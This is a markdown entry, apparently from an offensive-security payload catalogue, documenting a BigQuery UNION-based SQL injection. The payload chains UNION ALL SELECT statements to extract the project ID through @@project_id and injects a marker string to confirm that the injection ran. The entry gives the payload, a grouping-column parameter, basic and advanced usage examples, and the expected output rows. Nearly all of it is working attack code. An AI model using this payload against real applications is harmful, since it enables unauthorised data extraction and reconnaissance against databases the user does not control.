---
type: command
executor: sql
data: >-
  UNION ALL SELECT (SELECT @@project_id), 1, 1, 1, 1, 1, 1 AS T1 GROUP BY
  $_COLUMN_NAME UNION ALL SELECT (SELECT 'asd'), 1, 1, 1, 1, 1, 1 AS T1 GROUP BY
  $_COLUMN_NAME
output: null
created_at: '2023-04-06T03:56:32.353245+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - GCP
tags:
  - sqli
  - validation
verified: true
validated: true
---

# bigquery-union-select-project-id-and-test-string

## Command

```sql
UNION ALL SELECT (SELECT @@project_id), 1, 1, 1, 1, 1, 1 AS T1 GROUP BY $_COLUMN_NAME UNION ALL SELECT (SELECT 'asd'), 1, 1, 1, 1, 1, 1 AS T1 GROUP BY $_COLUMN_NAME
```

## Description

A chained union injection that extracts the project ID and injects a test string 'asd' to validate payload execution and distinguish injected results.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_COLUMN_NAME | Column for grouping | Yes |

## Examples

### Basic Usage

```sql
SELECT * FROM table UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1 AS T1 GROUP BY id UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1 AS T1 GROUP BY id
```

### Advanced Usage

```sql
SELECT * FROM table UNION ALL SELECT (SELECT @@project_id),'test',NULL AS T1 GROUP BY id UNION ALL SELECT 'asd','validate',NULL AS T1 GROUP BY id
```

## Expected Output

Multiple injected rows:

| col1     | col2 | ... |
|----------|------|-----|
| myproj   | 1    | ... |
| asd      | 1    | ... |

## Related

- [[procedures/BigQuery-Union-Based-SQL-Injection]]
